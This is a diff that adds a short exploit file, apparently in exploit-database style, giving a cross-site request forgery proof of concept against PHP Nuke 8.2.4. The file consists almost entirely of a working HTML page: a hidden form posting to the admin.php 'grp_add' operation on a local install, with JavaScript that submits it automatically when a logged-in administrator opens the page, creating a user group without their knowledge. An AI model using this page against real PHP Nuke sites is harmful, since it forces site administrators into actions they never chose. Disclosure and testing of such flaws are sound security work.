@@ -1,0 +1,26 @@
+###########################################################
+[~] Exploit Title:CSRF vulnerability
+[~] Author: sajith
+[~] version: PHP Nuke 8.2.4
+[~] vulnerable app link:http://phpnuke.org/modules.php?name=Release
+###########################################################
+ [CSRF add group]
+
+<html lang="en">
+<head>
+<title>CSRF POC( PHP nuke 8.2.4)</title>
+</head>
+<body>
+<form action="http://127.0.0.1/phpnuke-release-8.2.4/phpnuke/html/admin.php"
+id="formid" method="post">
+<input type="hidden" name="name" value="testing" />
+<input type="hidden" name="description"
+value="testing+for+CSRF%3Cbr+%2F%3E" />
+<input type="hidden" name="points" value="0" />
+<input type="hidden" name="op" value="grp_add" />
+</form>
+<script>
+document.getElementById('formid').submit();
+</script>
+</body>
+</html>
